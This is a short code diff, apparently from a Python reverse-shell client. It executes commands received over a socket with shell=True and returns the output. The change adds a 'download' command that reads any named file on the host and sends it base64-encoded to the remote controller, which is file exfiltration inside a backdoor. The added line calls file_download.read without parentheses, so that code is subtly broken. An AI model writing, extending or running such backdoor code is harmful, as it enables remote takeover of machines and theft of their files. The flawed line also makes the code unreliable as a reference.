@@ -1,6 +1,7 @@
 import socket
 import os
 import subprocess
+import base64
 
 def shell():
     current_dir = os.getcwd()
@@ -19,6 +20,9 @@ def shell():
             os.chdir(res[3:])
             result = os.getcwd()
             client.send(result.encode())
+        elif res[:8]=="download": #enviar arquivo
+            with open(res[9:],'rb') as file_download:
+                client.send(base64.b64encode(file_download.read))
         else:
             proc=subprocess.Popen(res,shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
             result=proc.stdout.read()+proc.stderr.read()
